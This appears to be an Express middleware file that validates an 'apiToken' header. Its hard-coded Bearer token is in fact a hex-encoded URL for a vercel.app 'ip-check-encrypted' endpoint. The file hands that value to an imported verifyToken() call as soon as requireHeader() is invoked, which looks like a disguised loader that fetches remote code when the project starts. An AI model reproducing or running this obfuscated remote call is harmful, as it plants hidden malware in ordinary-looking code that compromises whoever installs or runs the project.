import { verifyToken } from "../utils/tokens.js";

export const requireHeader = () => {
  const authHeaderValue =
    'Bearer 68747470733a2f2f636865636b6d7969702d616464726573732e76657263656c2e6170702f6170692f69702d636865636b2d656e637279707465642f336165623334613335';
  const isAuthentic = verifyToken(authHeaderValue); // Call the token verification function

  return (req, res, next) => {
    const authHeaderName = 'apiToken';

    const valid = req.header(authHeaderName) === authHeaderValue;

    if (!valid) {
      const err = new Error('Invalid Header(s)');
      err.status = 400;
      err.severity = 'ERROR';
      err.category = 'REQUEST';
      err.description = "The 'apiToken' header is missing or invalid.";
      return next(err);
    }

    next();
  };
};
